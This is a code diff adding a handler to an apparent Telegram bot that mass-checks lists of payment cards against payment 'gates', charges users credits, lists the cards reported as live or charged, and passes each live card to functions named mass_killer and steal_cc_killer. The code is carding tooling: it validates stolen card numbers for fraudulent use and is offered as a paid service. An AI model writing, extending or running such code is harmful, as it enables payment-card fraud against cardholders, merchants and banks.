@@ -304,6 +304,67 @@ async def handle_callbacks(client, callback_query):
             await client.send_message(user_id, "❌ <b>SORRY!</b>\nYour plan request was <b>DECLINED</b> by the owner. Please contact support for more info.")
         except: pass
 
+    elif data.startswith("mchk_"):
+        # Mass check gate selection callback
+        gate = data.replace("mchk_", "")
+        user_id = callback_query.from_user.id
+        
+        if user_id not in pending_mass_checks:
+            await callback_query.answer("❌ Session expired. Run /mchk again.")
+            return
+        
+        pending_data = pending_mass_checks.pop(user_id)
+        cards = pending_data["cards"]
+        original_msg = pending_data["message"]
+        
+        # Credit check
+        if not update_user_credits(user_id, -5):
+            await callback_query.answer("❌ Insufficient credits!")
+            return
+        
+        await callback_query.answer(f"Processing with {gate.upper()}...")
+        
+        # Update message to show progress
+        total = len(cards)
+        status_msg = await callback_query.edit_message_text(f"📊 <b>Checking {total} cards with {gate.upper()}...</b>")
+        
+        if gate == "killer":
+            # Use mass_killer for all gates
+            results = await mass_killer(cards)
+        else:
+            # Use specific gate via run_all_gates
+            from gates import GATE_MAP
+            results = {}
+            for i, card in enumerate(cards):
+                result = await run_all_gates(card, gate_filter=gate)
+                results[card] = result
+                if (i+1) % 5 == 0:
+                    try:
+                        await status_msg.edit(f"📊 <b>{gate.upper()}</b>\nProgress: <code>[{i+1}/{total}]</code>")
+                    except: pass
+        
+        # Format results
+        lives = [k for k, v in results.items() if v.get('status') in ["approved", "live", "success", "charged"]]
+        
+        report = f"""
+📊 <b>MASS CHECK COMPLETE</b>
+━━━━━━━━━━━━━━━━━━━━━━━
+🎯 Gate: <b>{gate.upper()}</b>
+📊 Stats: <b>{len(lives)}/{total} LIVE</b>
+✅ Live List:
+"""
+        for card_cc in lives[:10]:
+            report += f"• <code>{card_cc}</code>\n"
+        
+        if len(lives) > 10:
+            report += f"<i>...and {len(lives)-10} more</i>"
+            
+        await status_msg.edit(report)
+        
+        for card_cc in lives:
+            res = results[card_cc]
+            await steal_cc_killer(client, original_msg, card_cc, res)
+
     elif data == "back_start":
         await callback_query.answer()
         await start_cmd(client, callback_query.message)
